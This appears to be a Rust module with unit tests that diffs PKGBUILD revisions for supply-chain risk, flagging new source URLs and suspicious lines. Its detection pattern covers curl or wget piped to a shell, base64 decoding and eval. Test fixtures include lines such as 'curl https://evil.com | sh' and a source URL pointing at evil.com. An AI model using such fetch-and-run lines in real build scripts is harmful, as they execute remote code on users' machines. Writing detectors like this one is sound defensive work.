use serde::{Deserialize, Serialize};
use std::collections::HashSet;

/// Security-focused delta between two PKGBUILD revisions. Line-set based:
/// for supply-chain purposes "what appeared that wasn't there before" matters
/// more than minimal edit distance.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct PkgbuildDiff {
    pub added_sources: Vec<String>,
    pub removed_sources: Vec<String>,
    pub suspicious_additions: Vec<String>,
    pub change_risk: u32,
}

fn is_suspicious_line(line: &str) -> bool {
    let lower = line.to_lowercase();
    let fetch = lower.contains("curl") || lower.contains("wget");
    let interpreter = ["| sh", "|sh", "| bash", "|bash", "base64", "eval ", "eval$"]
        .iter()
        .any(|m| lower.contains(m));
    (fetch && interpreter) || lower.contains("base64 -d") || lower.contains("eval")
}

/// Extracts URLs ONLY from `source=(...)` assignments, ignoring curl/wget lines.
fn extract_source_urls(text: &str) -> Vec<String> {
    let mut in_source = false;
    let mut urls = Vec::new();

    for line in text.lines() {
        let trimmed = line.trim();
        if trimmed.starts_with("source=") || trimmed.starts_with("source+=(") {
            in_source = true;
        }

        if in_source {
            for word in trimmed.split_whitespace() {
                let clean = word
                    .trim_matches(|c| c == '(' || c == ')' || c == '\'' || c == '"' || c == ',');
                if clean.contains("://") || clean.starts_with("git+") {
                    urls.push(clean.to_string());
                }
            }
            if trimmed.contains(')') && !trimmed.starts_with("source=(")
                || (trimmed.ends_with(')') && trimmed.contains('='))
            {
                in_source = false;
            }
        }
    }
    urls
}

pub fn diff_pkgbuild_text(old_text: &str, new_text: &str) -> PkgbuildDiff {
    let old_urls: HashSet<String> = extract_source_urls(old_text).into_iter().collect();
    let new_urls: HashSet<String> = extract_source_urls(new_text).into_iter().collect();

    let added_sources: Vec<String> = new_urls.difference(&old_urls).cloned().collect();
    let removed_sources: Vec<String> = old_urls.difference(&new_urls).cloned().collect();

    let old_lines: HashSet<String> = old_text.lines().map(String::from).collect();
    let suspicious_additions: Vec<String> = new_text
        .lines()
        .filter(|l| !old_lines.contains(*l) && is_suspicious_line(l))
        .map(|l| l.trim().to_string())
        .collect();

    let change_risk =
        (added_sources.len() as u32 * 20 + suspicious_additions.len() as u32 * 30).min(60);

    PkgbuildDiff {
        added_sources,
        removed_sources,
        suspicious_additions,
        change_risk,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn identical_pkgbuilds_yield_empty_diff() {
        let text = "pkgname=test\nsource=('https://example.com/a.tar.gz')\n";
        let d = diff_pkgbuild_text(text, text);
        assert!(d.added_sources.is_empty());
        assert!(d.removed_sources.is_empty());
        assert!(d.suspicious_additions.is_empty());
        assert_eq!(d.change_risk, 0);
    }

    #[test]
    fn detects_newly_added_source_url() {
        let old = "source=('https://example.com/a.tar.gz')\n";
        let new = "source=('https://example.com/a.tar.gz' 'https://evil.com/patch.sh')\n";
        let d = diff_pkgbuild_text(old, new);
        assert_eq!(
            d.added_sources,
            vec!["https://evil.com/patch.sh".to_string()]
        );
        assert!(d.removed_sources.is_empty());
        assert_eq!(d.change_risk, 20);
    }

    #[test]
    fn detects_removed_source_url() {
        let old = "source=('https://a.com/x.tar.gz' 'https://b.com/y.patch')\n";
        let new = "source=('https://a.com/x.tar.gz')\n";
        let d = diff_pkgbuild_text(old, new);
        assert_eq!(d.removed_sources, vec!["https://b.com/y.patch".to_string()]);
        assert!(d.added_sources.is_empty());
    }

    #[test]
    fn detects_new_network_or_shell_lines_in_diff() {
        let old = "build() {\n  make\n}\n";
        let new = "build() {\n  curl https://evil.com | sh\n  make\n}\n";
        let d = diff_pkgbuild_text(old, new);
        assert!(d.suspicious_additions.iter().any(|s| s.contains("curl")));
        assert!(d.added_sources.is_empty());
        assert_eq!(d.change_risk, 30);
    }

    #[test]
    fn clean_build_line_addition_is_not_suspicious() {
        let old = "build() {\n  make\n}\n";
        let new = "build() {\n  make\n  make install\n}\n";
        let d = diff_pkgbuild_text(old, new);
        assert!(d.suspicious_additions.is_empty());
        assert_eq!(d.change_risk, 0);
    }

    #[test]
    fn change_risk_is_capped_at_60() {
        let old = "";
        let new = "source=('https://a.com/1' 'https://a.com/2' 'https://a.com/3' 'https://a.com/4')\nbuild() {\n  curl x | sh\n}\n";
        let d = diff_pkgbuild_text(old, new);
        assert_eq!(d.change_risk, 60);
    }
}
